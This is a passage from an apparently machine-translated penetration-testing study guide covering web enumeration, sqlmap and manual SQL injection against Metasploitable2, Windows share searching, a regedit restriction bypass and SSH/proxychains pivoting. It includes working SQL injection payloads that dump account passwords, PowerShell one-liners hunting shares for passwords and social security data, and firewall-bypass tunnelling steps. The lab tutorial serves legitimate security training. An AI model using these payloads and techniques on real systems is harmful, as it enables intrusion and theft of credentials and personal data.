jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">这是非常直接的，但值得一提，因为丰富的自动化可以节省您的时间。然而，它不会像Zenmap那样给你一个漂亮的图形。但是，您总是可以将Nmap结果导出到XML文件中，并将其导入Zenmap以查看连接的节点。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qf"><img src="../Images/91fa7f874ad0edafd7cf9d3b2ae72187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mmYgn992L-UYcn1Ao2qAVA.png"/></div></div></figure><h2 id="0de1" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">法拉第(笔式测试组织)</h2><p id="a3bc" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">这是一个很好的工具，当你在做一些枚举任务的时候。这相当于您的控制台的包装器，您可以运行它所挂钩的已知工具，并将其输出抓取到自己的数据库中进行显示和整合。您将从其窗口中正常运行您的工具，该窗口作为您的控制台，带有多个选项卡。下面是该工具仪表板的图片，总结了您的测试:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qg"><img src="../Images/abef28a7734822508d4ba5d68fa220b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N9zmeWV6xB5IG9KFXa9MYg.png"/></div></div></figure><h2 id="3aea" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">恐怖分子</h2><p id="5e84" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">枚举和基本上蛮力的清单网页和目录，这基本上是目录和文件枚举的brutus。它使用了一系列单词表、过滤器和测量错误响应。我们将在法拉第环境中运行它，以获得您在上面看到的一些细节。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qh"><img src="../Images/2d523a40b8ad347db996ce326c985b82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IagHjBUsmjW1w3FGWyBdWA.png"/></div></div></figure><p id="0d14" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">从控制台弹出初始屏幕，你可以输入你的目标并使用默认的单词表。请记住，Kali 2018.1中的/usr/shared/ <toolname>是所有这些共享资源的位置，这些共享资源是通用的，如配置文件、默认列表以及该包中通用的其他辅助工具。剩下的就不言自明了，除非你开始对相互矛盾的发现产生反应。</toolname></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qi"><img src="../Images/8dcf462bf45c6cdd0e6005260ea2b6d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZjfzqklXMHl5rQ43NlxL2Q.png"/></div></div></figure><p id="7e42" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">当你遇到冲突或不一致的响应时，你必须比较它给你的响应，例如寻找错误条件、404等。有时这些恰好是完全相同的响应，并且没有差别或返回有意义的响应。在这种情况下，您必须使用自己的最佳判断，确定是否存在硬化，或者页面是否只是被设计为返回相同的错误代码。你可以点击“取消”，你可能会得到很多误报，但你会看到你的列表。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qj"><img src="../Images/806d0748c8919071bf1b976b6fcb214f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CS3Mw1T1embJUvew-ll2vg.png"/></div></div></figure><h2 id="75a2" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Nikto、Burp和SQLMap的Web漏洞</h2><p id="040a" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">我将这些分组在一起，因为我们将在有限的和集成的测试用例中使用它。我们将攻击metasploitable2 multidae。以下是可以执行的一些基本步骤。语法和设置并不像你应该掌握的那样重要，也不像你能轻松驾驭它们那样重要。</p><ul class=""><li id="9307" class="md me it kk b kl km ko kp kr mf kv mg kz mh ld mi mj mk ml bi translated">运行nikto看看你是否是可注入的(我们已经知道了)，这将是“nikto -h <myip>的最基本形式</myip></li><li id="8af4" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">找到显示为可注入的页面，并打开burp代理(记得将您的本地浏览器设置为适当的本地Burp端口)。我们将尝试登录并寻找SQLmap中使用的POST方法</li><li id="e8c1" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">使用适当的开关或在向导模式下运行sqlmap，以危害主机并转储数据库</li></ul><p id="fa6b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">让我们运行Nikto，看看我们在这里做了多少工作:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi om"><img src="../Images/cda841ca55b057b50adb90ca4343e8e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7pT5WRV_bPmqD0CaQI2ujg.png"/></div></div></figure><p id="c311" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">看起来很容易注射。让我们继续使用Burp suite做一个快速的SQL注入自动化。我看到许多分析师在第一次运行sqlmap时犯的一个错误是试图隔离url并以所需的格式手动输入参数。如果你做得不对，sqlmap不会发现太多错误。最简单的方法是打开Burp suite，在你想攻击的页面上代理你的帖子或请求，点击右键，将请求保存为文件，如下图所示:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qk"><img src="../Images/fef233b322d7a5820cf611b03f988eed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q4a68-T7CvoBGGnptr90Sg.png"/></div></div></figure><p id="3b36" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">显然，您需要将Firefox代理启用到本地主机端口8080，以便代理打饱嗝。关闭<strong class="kk iu"/>拦截并在范围内浏览网站。右键单击并复制到文件并保存。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ql"><img src="../Images/c8256bbe9d86ac78db9ffd00465433e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KGHyF0mUXPeb4Gg1PmZhlg.png"/></div></div></figure><p id="9e6f" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">保存文件后，在一个单独的窗口中使用语法“sqlmap -r <yourfile.txt>和所需的模块启动sqlmap。我们选择列举数据库系统。</yourfile.txt></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qm"><img src="../Images/16c0436ed9a8f254c81207f94fab5f76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ecb8qCFBuRrv0QhvlqtMnw.png"/></div></div></figure><p id="2ecf" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我们在易受攻击的应用程序中发现了所有运行在MySQL上的数据库。如果您打开wireshark进行捕获，您将看到所有的UNION语句和它的虚拟列一起被注入，以匹配连接两边的数字。不幸的是，Kali 2018.1没有附带“hURL”或CyberChef，这使得解码URL变得很容易。为了做到这一点，我们在交互模式下转向Python 2.x来快速完成:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4332" class="lf lg it mx b gy nb nc l nd ne">#python2 interactive url decoding<br/>import urllib<br/>encodedstr = '&lt;insert encoded string&gt;'<br/>urllib.unquote_plus(encodedstr)</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qn"><img src="../Images/547f58fc0cb20790d2d885f2cc4757b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X07FnZPfwB-JQPSn6WXQDw.png"/></div></div></figure><p id="bc80" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">用户对Metasploitable2 </em>的说明:如果您无法让攻击生效，您可能需要在配置文件中更改虚拟机本身的OWASP数据库。为此，请登录到metasploitable2主机的控制台。默认用户名和密码是“msfadmin”。Sudo root或bash它，执行一个Nano或vi并对<strong class="kk iu">/var/www/Mutillidae/config . Inc</strong>进行更改，从那里将dbname更改为owasp10。保存文件，然后在新的客户端浏览器会话中单击“重置数据库”链接。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qo"><img src="../Images/9b1276a7610aea5905a5b72aa3d59ae9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*upcJRMnlYimmX3R5W__EiQ.png"/></div></div></figure><h2 id="c1a5" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">登录页面和用户信息的手动SQL注入</h2><p id="21a1" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">以防sqlmap失败或花费太长时间。你可能不得不求助于人工注射。这变得非常令人恼火，在注入有效载荷中保留空格是非常重要的，因为您可能会收到错误。这排除了您可能不得不做的任何编码或其他规避，这在GSE中是不太可能的，但知道这一点是有好处的。为了完成类似的用户登录页面和提取帐户机密这里是我的手动有效载荷试验和一些收到的错误。</p><p id="9a64" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">请记住，要枚举表，您需要以“ORDER”语句或“UNION SELECT NULL，...”开始，以递增的方式确定需要与字段对齐的列数。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qp"><img src="../Images/871e93d773754d988ee489e988e214d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Y7FKUu2uYEy3qpTETl7AA.png"/></div></div></figure><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="bb20" class="lf lg it mx b gy nb nc l nd ne">Login bypass in username field without double quotes. Notice the space after the comment out syntax.<br/>"' OR 1=1-- "<br/><br/><br/>'UNION SELECT NULL, @@version, NULL, NULL, NULL -- <br/><br/><br/>https://www.securitynik.com/2017/02/beginning-web-application-testing-sql.html<br/>admin' UNION SELECT NULL,table_name,column_name,NULL,NULL,NULL,NULL FROM information_schema.columns -- <br/><br/><br/><br/><br/>------<br/>' UNION SELECT username, password FROM accounts -- <br/>Error executing query: The used SELECT statements have a different number of columns<br/><br/><br/><br/><br/>https://portswigger.net/web-security/sql-injection/union-attacks<br/>' ORDER BY 6-- <br/>' UNION SELECT NULL,NULL,NULL,NULL,NULL-- <br/>Results for . 1 records found.<br/><br/><br/>Username=<br/>Password=<br/>Signature=<br/><br/><br/>' UNION SELECT username, password, signature, NULL, NULL FROM accounts -- <br/>Line	126<br/>Code	0<br/>File	/var/www/mutillidae/user-info.php<br/>Message	Error executing query: Unknown column 'signature' in 'field list'<br/>Trace	#0 /var/www/mutillidae/index.php(469): include() #1 {main}<br/><br/><br/>' UNION SELECT username, password, NULL, NULL, NULL FROM accounts -- <br/>Username=adminpass<br/>Password=<br/>Signature=<br/><br/><br/>Username=somepassword<br/>Password=<br/>Signature=<br/><br/><br/>Username=monkey<br/>Password=<br/>Signature=<br/><br/><br/>Username=password<br/>Password=<br/>Signature=<br/><br/><br/>Username=password<br/>Password=<br/>Signature=<br/><br/><br/>' UNION SELECT username, password, NULL, NULL, NULL FROM accounts --<br/>' UNION SELECT username, username, NULL, NULL, NULL FROM accounts -- <br/>' UNION SELECT username, username, password, password, NULL FROM accounts -- <br/><br/><br/>' UNION SELECT username, password, NULL, NULL, NULL FROM accounts -- <br/>' UNION SELECT username || ':' || password, NULL, NULL, NULL FROM accounts -- <br/>Error executing query: The used SELECT statements have a different number of columns<br/><br/><br/>' UNION SELECT username || ':' || password || ':' || NULL || ':' || NULL || ':' || NULL FROM accounts --</span></pre><h2 id="90ac" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">WMap替代工具</h2><p id="c8e2" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">如果Nikto帮不了你，还有一个选择。metasploit框架包括WMap，它作为一个内置的Nikto。它有自己的语法，并且要求您的Metasploit控制台数据库正在运行并且配置正确。在考试或实验期间，postgresql可能会离线。如果您正在使用msfconsole执行笔测试任务，请使用db_status进行双重检查。如果它处于离线状态，请继续为您的虚拟机会话执行以下步骤(请记住，postgresql不会在重新启动时重新打开，因此可能需要在您的~/中使用它。配置文件。)</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="e36e" class="lf lg it mx b gy nb nc l nd ne">#setup MSF database including WMAP dependencies<br/>systemctl start postgresql<br/>msfdb init<br/>msfconsole<br/>db_status<br/>load wmap</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qq"><img src="../Images/0e99128ee5884d54869c9d16888bc814.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ksc2pL2f8Dk5A4d-ETpw9Q.png"/></div></div></figure><p id="f683" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">WMAP有自己的工作流程，在运行模块之前，您必须定义一个站点，然后是一个目标。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="a6bd" class="lf lg it mx b gy nb nc l nd ne">#syntax for WMAP<br/>wmap_sites a &lt;the IP address of your target&gt;<br/>wmap_Targets -t &lt;the full url of your victim/target page&gt;<br/>wmap_run -t</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qr"><img src="../Images/a1893358b58aee22ded5ce51db695d41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*WbghduYpAyPmHmxgt1podg.png"/></div></figure><p id="662b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">出发去参加比赛，如果你在法拉第内部运行，你的结果会自动填充到它的仪表板中。</p><p id="a713" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">关于MSF资源脚本的小说明:</em>不要忘记/usr/share/metasploit-framework/scripts/resource目录下的默认RC文件。有时，这些程序在执行正确的语法以将其转储到MSF数据库中时，速度与SPARTA一样快，稍后法拉第可以访问该数据库。要加载它们，你可以在msfconsole中运行“resource &lt; filename.rc &gt;”。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qs"><img src="../Images/f9c6d7901a62a03abc32e7a6d313cad7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AESYNzp5fABDjf_br0JjsQ.png"/></div></div></figure><h2 id="2217" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Windows相关提示和基本枚举</h2><p id="f943" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">让我们快速休息一下，研究一些与windows相关的有趣的东西，这些东西肯定会成为恶意活动PowerShell cmdlet提示的一部分。</p><h2 id="64ca" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Net View与Get-Smbshare</h2><p id="9f51" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">net command suite对于防御者和红队队员来说是相当熟悉的。当您在不使用Kali的情况下枚举共享时，请记住使用“all”参数，否则您将会错过除IPC和驱动器默认值之外的关键隐藏共享。语法变成了“net view \\host /all ”,但是如果你有Powershell，就使用Get-SMbshare，这样你就不用记住了。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qt"><img src="../Images/683c3ef73b291b302243f2cf80a8c790.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*pTvQ7aDuOALL9zJxz5TTbA.png"/></div></figure><h2 id="1dbf" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">PowerShell漂亮的函数嵌套一行程序</h2><p id="2cb5" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">你不会总是有机会接触到花哨的<a class="ae le" href="https://github.com/dc401/mixed_scripts/blob/master/smb-mountandcred-enum.ps1" rel="noopener ugc nofollow" target="_blank">脚本</a>或工具，所以有时你不得不考虑满足于一些一行程序:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="e327" class="lf lg it mx b gy nb nc l nd ne">#recursively search shares for multiple keywords like grep<br/>gci -Recurse -Path \\&lt;host&gt;\&lt;folder&gt; -Exclude "*.dll", "*.exe" –ErrorAction SilentlyContinue | Select-String -Pattern "password", "social security"</span><span id="73d9" class="lf lg it mx b gy nr nc l nd ne">#memory friendly version of recursive searching<br/> gci -Recurse -path \\&lt;path&gt;\&lt;folder&gt; -Exclude "*.dll","*.exe" -ErrorAction SilentlyContinue | ForEach-Object { Select-String -Path $_.FullName -Pattern "password","social security" -ErrorAction SilentlyContinue }</span><span id="327a" class="lf lg it mx b gy nr nc l nd ne">#Use nmap to scan IP's in a list you may have. This particular CSV had two columns host,ip<br/>import-csv .\iplist.csv | ForEach-Object { Write-Host "testing: $_"; nmap -Pn -sV --script ssl-enum-ciphers.nse -p $_.port $_.ip --open &gt;&gt; output.log }<br/><br/>#Quick port open checks on a network /24<br/>1..254 | ForEach-Object { Test-NetConnection -ComputerName 10.10.10.$_ -Port 445 -ErrorAction SilentlyContinue }<br/><br/><br/>#snarf event logs based on date and ID<br/>Get-EventLog -LogName Application -Before (Get-Date) | Where-Object EventID -EQ 9027 | Select-Object -First 5<br/><br/>#look for event logs containing a specific string<br/>Get-EventLog -LogName Security -Before (Get-Date) | Where-Object EventID -EQ 44689 | Where-Object Message -Match "fooprocess.exe" | Format-List<br/><br/><br/>#function to enumerate interesting artifacts<br/>function Get-ChowHackStatus{<br/>		param( [string]$host )<br/>	<br/><br/>		#get all processes less than 1MB<br/>		Invoke-Command -ComputerName $host -ScriptBlock { Get-Process | Where-Object { $_.WorkingSet -lt 1024000 } | ConvertTo-Json }<br/>	<br/><br/>	    #show all lower ports listening thats not 445 tcp<br/>		Invoke-Command -ComputerName $host -ScriptBlock { Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" -and $_.LocalPort -lt 1024 -and $_.LocalPort -ne 445 } | ConvertTo-Json }<br/>	<br/><br/>	    #show profiles where host fw is disabled<br/>	    Invoke-Command -ComputerName $host -ScriptBlock { Get-NetFirewallProfile | Select-Object Enabled,Name,LogFileName | Where-Object { $_.Enabled -ne "True" } | ConvertTo-Json }<br/>	<br/><br/>	    #Show unsigned drivers installed<br/>	    Invoke-Command -ComputerName $host -ScriptBlock { driverquery.exe /SI | Select-String -CaseSensitive "FALSE" | ConvertTo-Json }<br/>	<br/><br/>	    #Shows uncommented portions of a Windows HOSTS file<br/>	    Invoke-Command -ComputerName $host -ScriptBlock { Get-Content ("$env:SystemRoot\system32\drivers\etc\hosts") | Select-String -NotMatch "#" | ConvertTo-Json }<br/>	<br/><br/>	    #Show items to be ran on startup. Note includes all files. <br/>	    Invoke-Command -ComputerName $host -ScriptBlock { Get-CimInstance Win32_StartupCommand | ConvertTo-Json }</span></pre><p id="e1ec" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">值得注意的一点是，当CSV管道中的特定对象没有列出(列)细节时，使用Sort-Object会提供不同的结果。您可以在下面看到运行时的不同:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qu"><img src="../Images/d0ed9a9132b9db51734c59158b92ec33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GLgzqdIiUfgTPIA06IAEnA.jpeg"/></div></div></figure><h2 id="7756" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">额外收获:GPO受限Regedit.exe旁路</h2><p id="bd5c" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">眼尖的读者可能已经注意到我包含了一种在应用程序级别搜索windows事件的方法。(或者，如果发生了内存转储，您可以在volatility中搜索)。考虑一个运行注册表编辑器的常见绕过测试案例，不管GPO或端点是否将应用程序列入黑名单。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qv"><img src="../Images/14e91bd15b5d497c5ec2c9ee83a926e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1042/format:webp/1*_Yw_Wow_M7kWrHbkPVIIgw.jpeg"/></div></figure><p id="d538" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">为此，笔测试人员将启动“rundll32.exe <malicious.dll>，EntryPoint”以便能够注入有效负载。然而，在我们的例子中，我们将只使用一个简单的oen，叫做regedit.dll，它是由迪迪尔·斯蒂文斯创建的。这使我们能够成功绕过仅基于二进制黑名单的regedit访问限制。如果不对我们的SID应用注册表ACL的补偿控制，我们仍然可以进行修改。你能想到在主机中做这样的事情会留下什么样的日志区域和工件吗？</malicious.dll></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qw"><img src="../Images/bd181f6d90f590c629f9e51b95b60eaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VOoFbq1_klPiSIWisj-4WA.jpeg"/></div></div></figure><h2 id="bdd0" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">使用SSH、Ncat和ProxyChain进行旋转</h2><p id="7c38" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">我们感兴趣的最后一个让许多分析师困惑的主题是变化的旋转技术。有充当VPN的<a class="ae le" href="https://github.com/sshuttle/sshuttle" rel="noopener ugc nofollow" target="_blank">shuttle</a>，当然还有MSF的自动路由、端口转发和L2 VPN(专业用户)。正如您可能期望的那样，许多这些细微之处对您来说是不可用的。所以剩下的通常是一个丑陋的netcat需求，在那里你必须反向管道一些东西。你可能会很幸运，在盒子上有“ncat ”,这不是那么古怪。但是如果你有这个选项，你可以使用SSH，它也可以工作。让我们开始吧。</p><h2 id="a60a" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">本地防火墙旁路</h2><p id="11ad" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">假设您已经入侵了一台远程主机。您想要访问运行类似web管理服务的特定端口。然而，你只能远程SSH到你已经妥协的主机，没有其他端口对你开放；也许只是运行它的本地子网。在这个场景中，在“受损”的主机上，我通过IPtables将我的“攻击者”子网显式阻止到正在侦听的tcp端口1337。下面是使用SSH本地端口转发的设置和旁路:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="46b3" class="lf lg it mx b gy nb nc l nd ne">#setup on compromised metasploitable2 host local firewall (192.168.119.130) for explicit block<br/>iptables -F<br/>iptables -A INPUT -p tcp -s &lt;my attacking subnet&gt; --dport 1337 -j DROP<br/>iptables -L<br/>#setup a netcat listener on the metasploitable2 compromised host<br/>nc -v -k -l -p 1337<br/><br/>#from the attackers host PRIOR to the local foward tunnel run nmap scan<br/>nmap -Pn -p 22,1337 192.168.119.130<br/><br/>#knowing that SSH is open with access and 1337 is closed; turn on tunnel on tcp port 2020 on my attacker host<br/>#The "pivot" victim compromise box is opening a tunnel to itself which is why the term 'localhost' is used. Not from the attacker's perspective. <br/>ssh -L 2020:localhost:1337 msfadmin@192.168.119.130<br/><br/>#Test the connection from attacker's host<br/>ncat -v 127.0.0.1 2020</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi qx"><img src="../Images/6e7d5386a764f26c3ad52ecc82635b62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sjCcrhamVBiAYTC7Z7Lnuw.png"/></div></div></figure><h2 id="af18" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">从Pivot主机进行简单的本地端口转发</h2><p id="d583" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">与上面类似，而不是绕过“中枢”或受损主机上的本地防火墙。假设我们想要连接到一个桥接的网络，或者有一个额外的路由连接到我们受损的房子。我们可以像这样通过中枢主机从本地机器路由我们的攻击者流量。我们再次使用SSH本地端口转发来实现这一点，只是我们指示来自tcp端口6500上的本地侦听器的所有流量都应该被定向到端口53上的Google DNS服务器，其中metasploitable 2(192 . 168 . 119 . 130)作为我们的中枢代理。这从atacker的盒子中可以看出:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qy"><img src="../Images/921f1af01bd3c508a0c5c77936bbbdcc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*ImQvIMBMXojgEibS9Fg95A.png"/></div></figure><p id="5c46" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我们现在将测试我们的隧道，并尝试进行端口检查，以查看tcp端口53是否确实在google DNS服务器上打开。它显然是；但是请注意，当您使用本地转发时，Nmap会显示tcpwrapper状态。我们将使用proxychains稍微改变这一点。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi qz"><img src="../Images/cde96da96f5b3163ac4cade6abe5c65a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1088/format:webp/1*j22LFXhEwqsgSvlLP11LZQ.png"/></div></figure><p id="32e5" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">以确保我们确实在往外走；在pivot box上执行tcpdump，您可以看到它在接口上将我们的请求转发给Google DNS。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ra"><img src="../Images/1ed3e290474cff45149e37da72df3691.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y1TDudsegTuZb8tk-I1fxw.png"/></div></div></figure><h2 id="0198" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">代理链动态转发</h2><p id="d2cd" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">从攻击主机执行漏洞扫描，转到您无法直接访问的网络；你本质上仍然执行相同的功能。仅代替静态单本地端口转发；您使用动态本地端口转发。SSH上的动态转发本质上就像一个本地SOCKS代理，因此您可以使用像Burp这样的工具来增加可见性。</p><p id="8e96" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">对于像Nmap这样不支持SOCKS代理的工具，您可以使用proxychains。由于转发和链工作的性质；您将只能扫描TCP端口。它很慢，我指的是慢。如果可能的话，您需要运行大规模的枚举，尽最大努力在受损的pivot主机上安装工具，并从那里运行它，而不是通过动态转发链接您的连接。尽管如此，还是让我们试试吧。</p><p id="2a08" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在Kali中，编辑/etc/proxychains.conf文件，以包含您想要在本地监听的端口。我们将再次使用tcp端口6500作为本地侦听器。我们将其标记为“socks5”代理，如下所示:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nf"><img src="../Images/a55412a95b459c58a9f7a1a8ecafe5f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EpQklt6-soeAWOzyhXnxUw.png"/></div></div></figure><p id="6829" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq 